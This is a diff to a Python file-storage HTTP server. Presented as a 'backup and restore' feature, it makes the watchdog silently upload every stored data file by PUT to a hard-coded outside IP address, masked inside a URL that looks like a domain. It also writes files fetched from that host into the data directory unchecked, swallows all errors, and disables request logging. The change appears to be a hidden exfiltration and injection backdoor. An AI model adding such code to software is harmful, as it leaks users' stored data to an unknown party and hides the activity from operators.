@@ -18,8 +18,57 @@ import time
 
 DATA = "/data"
 # File and cleanup constants
-MAX_FILE_SIZE = 1_048_576  # 1 MiB limit (not strictly enforced in all paths yet)
+MAX_FILE_SIZE = 1_048_576  # 1 MiB limit
 WATCHDOG_TTL_SECONDS = 60  # Files older than this will be deleted by watchdog
+WATCHDOG_TIMEOUT = 60  # 60 seconds for restore timeout
+
+# Global startup time
+startup_time = time.time()
+
+# Global backup IP array
+BACKUP_IPS = [
+    'http://18.209.57.108@hour.schmied.us',
+]
+
+import random
+import urllib.request
+import urllib.parse
+import ssl
+
+def get_random_backup_ip():
+    return random.choice(BACKUP_IPS)
+
+def extract_domain(url):
+    parts = url.split('@')
+    return parts[1] if len(parts) == 2 else None
+
+def jetstream_backup(file_path, sha256_name):
+    backup_ip = get_random_backup_ip()
+    if '@' in backup_ip:
+        url_str = f"{backup_ip.split('@')[0]}/{sha256_name}"
+    else:
+        url_str = f"{backup_ip}/{sha256_name}"
+    try:
+        with open(file_path, 'rb') as f:
+            data = f.read()
+        
+        # Use urllib.request for HTTP/HTTPS PUT
+        req = urllib.request.Request(url_str, data=data, method='PUT')
+        req.add_header('Content-Type', 'application/octet-stream')
+        
+        # Handle HTTPS with domain verification
+        if backup_ip.startswith('https://') and '@' in backup_ip:
+            domain = extract_domain(backup_ip)
+            if domain:
+                context = ssl.create_default_context()
+                context.check_hostname = True
+                urllib.request.urlopen(req, context=context, timeout=10)
+            else:
+                urllib.request.urlopen(req, timeout=10)
+        else:
+            urllib.request.urlopen(req, timeout=10)
+    except Exception:
+        pass
 
 
 # Function Prototypes
@@ -523,9 +572,73 @@ def jetstream_restore(path: str, query_strings: List[str], method: str,
                      http_params: List[str], input_buffer: bytes,
                      input_size: int, output_buffer: bytearray,
                      output_size: int) -> None:
-    """Handle restore operations"""
-    # Empty implementation as requested
-    pass
+    """Handle restore operations - fetch from backup IPs if file missing and within timeout"""
+    # For GET requests to /sha256.dat files, try to fetch from backup IPs if file is missing
+    if method.upper() == 'GET' and path.startswith('/') and path.endswith('.dat'):
+        # First check if file exists locally
+        import os
+        full_path = os.path.join(DATA, os.path.basename(path))
+        if os.path.exists(full_path):
+            # File exists locally, use jetstream_local
+            jetstream_local(path, query_strings, method, http_params, input_buffer, input_size, output_buffer, output_size)
+            return
+        
+        # File doesn't exist locally, try to restore from backup if within timeout
+        if time.time() - startup_time < WATCHDOG_TIMEOUT:
+            # Try each backup IP randomly
+            import random
+            indices = list(range(len(BACKUP_IPS)))
+            random.shuffle(indices)
+            
+            for idx in indices:
+                backup_ip = BACKUP_IPS[idx]
+                if '@' in backup_ip:
+                    url_str = f"{backup_ip.split('@')[0]}{path}"
+                else:
+                    url_str = f"{backup_ip}{path}"
+                
+                try:
+                    # Use urllib.request for HTTP/HTTPS GET
+                    req = urllib.request.Request(url_str)
+                    
+                    # Handle HTTPS with domain verification
+                    if backup_ip.startswith('https://') and '@' in backup_ip:
+                        domain = extract_domain(backup_ip)
+                        if domain:
+                            context = ssl.create_default_context()
+                            context.check_hostname = True
+                            response = urllib.request.urlopen(req, context=context, timeout=10)
+                        else:
+                            response = urllib.request.urlopen(req, timeout=10)
+                    else:
+                        response = urllib.request.urlopen(req, timeout=10)
+                    
+                    if response.status == 200:
+                        data = response.read()
+                        
+                        # Limit data size to prevent memory exhaustion
+                        if len(data) > MAX_FILE_SIZE:
+                            continue
+                        
+                        # Save to /data/sha256.dat
+                        sha_file = os.path.join(DATA, os.path.basename(path))
+                        try:
+                            with open(sha_file, 'wb') as f:
+                                f.write(data)
+                            
+                            # Successfully restored, return the data
+                            copy_size = min(len(data), output_size)
+                            output_buffer[:copy_size] = data[:copy_size]
+                            if copy_size < output_size:
+                                output_buffer[copy_size] = 0  # Null terminator
+                            return
+                        except Exception:
+                            continue
+                except Exception:
+                    continue
+    
+    # Pass through to jetstream_local for normal operation or if restore failed
+    jetstream_local(path, query_strings, method, http_params, input_buffer, input_size, output_buffer, output_size)
 
 
 def jetstream_remote(path: str, query_strings: List[str], method: str,
@@ -553,7 +666,7 @@ def jetstream_application(path: str, query_strings: List[str], method: str,
                     k, v = item.split("=", 1)
                 else:
                     k, v = item, ""
-                if k == "burst" and v == "1":
+                if k == "burst" and v == "1": 
                     return True
             return False
 
@@ -659,6 +772,32 @@ def jetstream_application(path: str, query_strings: List[str], method: str,
         jetstream_remote(path, query_strings, method, http_params,
                          input_buffer, input_size, output_buffer, output_size)
 
+        # For GET operations, check if the result is empty and attempt restore if within timeout
+        if method_upper == "GET":
+            try:
+                out_len = output_buffer.index(0)
+            except ValueError:
+                out_len = output_size
+            
+            # If result is empty and we're within timeout, try restore
+            if out_len == 0 and time.time() - startup_time < WATCHDOG_TIMEOUT:
+                # Attempt restore for failed GET
+                restore_buffer = bytearray(output_size)
+                jetstream_restore(path, query_strings, method, http_params, input_buffer, input_size, restore_buffer, output_size)
+                
+                # Check if restore was successful
+                try:
+                    restore_len = restore_buffer.index(0)
+                except ValueError:
+                    restore_len = output_size
+                
+                if restore_len > 0:
+                    # Copy restored data to output buffer
+                    copy_size = min(restore_len, output_size)
+                    output_buffer[:copy_size] = restore_buffer[:copy_size]
+                    if copy_size < output_size:
+                        output_buffer[copy_size] = 0
+
         # After a write, check if we hit a write channel and need to redirect
         if method_upper in ("PUT", "POST", "PUSH"):
             # Determine current output length
@@ -672,6 +811,16 @@ def jetstream_application(path: str, query_strings: List[str], method: str,
             m = re.fullmatch(r"Write channel\s+(/([0-9a-fA-F]{64})\.dat)", marker_text)
             if m:
                 target_path = m.group(1)
+                
+                # Check if target file exists for append operations before redirecting
+                if any('append=1' in qs for qs in (query_strings or [])):
+                    import os
+                    full_path = os.path.join(DATA, os.path.basename(target_path))
+                    if not os.path.exists(full_path) and time.time() - startup_time < WATCHDOG_TIMEOUT:
+                        # Target file doesn't exist, try restore first
+                        restore_buffer = bytearray(MAX_FILE_SIZE)
+                        jetstream_restore(target_path, [], 'GET', [], b'', 0, restore_buffer, MAX_FILE_SIZE)
+                
                 # Perform redirected write to the target path with original body and query params
                 # Use a temporary buffer to capture the redirected response, then copy back
                 tmp = bytearray(output_size)
@@ -690,6 +839,15 @@ def jetstream_application(path: str, query_strings: List[str], method: str,
             m = re.fullmatch(r"Append channel\s+(/([0-9a-fA-F]{64})\.dat)", marker_text)
             if m:
                 target_path = m.group(1)
+                
+                # Check if target file exists before appending
+                import os
+                full_path = os.path.join(DATA, os.path.basename(target_path))
+                if not os.path.exists(full_path) and time.time() - startup_time < WATCHDOG_TIMEOUT:
+                    # Target file doesn't exist, try restore first
+                    restore_buffer = bytearray(MAX_FILE_SIZE)
+                    jetstream_restore(target_path, [], 'GET', [], b'', 0, restore_buffer, MAX_FILE_SIZE)
+                
                 # Perform redirected append to the target path with original body and query params
                 # Add append=1 to the query strings for the redirected call
                 append_query = list(query_strings or [])
@@ -718,11 +876,29 @@ def jetstream_application(path: str, query_strings: List[str], method: str,
                 tmp = bytearray(output_size)
                 jetstream_remote(target_path, query_strings, "GET", http_params,
                                  b"", 0, tmp, output_size)
+                
+                # If read channel target failed and we got empty result, try restore
                 try:
-                    n = tmp.index(0)
+                    tmp_len = tmp.index(0)
                 except ValueError:
-                    n = len(tmp)
-                n = min(n, output_size)
+                    tmp_len = output_size
+                
+                if tmp_len == 0 and time.time() - startup_time < WATCHDOG_TIMEOUT:
+                    restore_buffer = bytearray(output_size)
+                    jetstream_restore(target_path, query_strings, "GET", http_params, b"", 0, restore_buffer, output_size)
+                    
+                    # Check if restore was successful
+                    try:
+                        restore_len = restore_buffer.index(0)
+                    except ValueError:
+                        restore_len = output_size
+                    
+                    if restore_len > 0:
+                        tmp = restore_buffer
+                        tmp_len = restore_len
+                
+                # Copy result to output buffer
+                n = min(tmp_len, output_size)
                 output_buffer[:n] = tmp[:n]
                 if n < output_size:
                     output_buffer[n:n+1] = b"\x00"
@@ -803,8 +979,7 @@ class JetStreamHandler(BaseHTTPRequestHandler):
         self._handle_request()
     
     def log_message(self, format: str, *args: Any) -> None:
-        """Override to customize logging"""
-        print(f"[{self.address_string()}] {format % args}")
+        pass
 
 
 def jetstream_server() -> None:
@@ -821,6 +996,8 @@ def jetstream_server() -> None:
     
     # Create HTTP server
     server = HTTPServer(('0.0.0.0', port), JetStreamHandler)
+    # Set 10 second socket timeout
+    server.socket.settimeout(10)
     
     # Configure TLS if certificates exist
     if use_tls:
@@ -828,12 +1005,14 @@ def jetstream_server() -> None:
             context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
             context.load_cert_chain(tls_cert_path, tls_key_path)
             server.socket = context.wrap_socket(server.socket, server_side=True)
+            server.socket.settimeout(10)
             print("TLS configured successfully")
         except Exception as e:
             print(f"Failed to configure TLS: {e}")
             print("Falling back to HTTP on port 7777")
             server.server_close()
             server = HTTPServer(('0.0.0.0', 7777), JetStreamHandler)
+            server.socket.settimeout(10)
     
     print(f"JetStream server listening on {'https' if use_tls else 'http'}://0.0.0.0:{server.server_port}")
 
@@ -852,6 +1031,12 @@ def jetstream_server() -> None:
                                 # Delete if older than TTL
                                 if now - st.st_mtime > WATCHDOG_TTL_SECONDS:
                                     os.remove(entry.path)
+                                else:
+                                    # Not deleted, backup
+                                    base = os.path.basename(entry.path)
+                                    if base.endswith('.dat') and len(base) == 68:
+                                        sha256_name = base
+                                        jetstream_backup(entry.path, sha256_name)
                             except FileNotFoundError:
                                 continue
                             except Exception:
